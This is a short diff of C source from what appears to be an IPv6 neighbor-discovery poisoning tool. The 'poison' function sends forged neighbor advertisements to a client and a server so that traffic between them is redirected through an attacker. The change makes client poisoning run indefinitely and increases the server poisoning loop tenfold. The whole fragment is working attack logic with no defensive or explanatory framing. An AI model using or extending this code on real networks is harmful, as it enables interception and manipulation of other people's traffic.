@@ -39,15 +39,17 @@ void poison(struct victim *dst) {
 
 	printf("Setting up Client poisoning\n");
 	pkt = alloc_ndadvert(&svictim, dst);
-	for(i = 0; i < 100; i++) {
+	//for(i = 0; i < 1000; i++) {
+	for(;;) {
 		send_icmpv6(&(dst->ipv6), pkt);
+		sleep(1);
 	}
 	free(pkt);
 	printf("Client poisoned\n");
 
 	printf("Setting up Server poisoning\n");
 	pkt = alloc_ndadvert(dst, &svictim);
-	for(i = 0; i < 100; i++) {
+	for(i = 0; i < 1000; i++) {
 		send_icmpv6(&svictim.ipv6, pkt);
 	}
 	free(pkt);
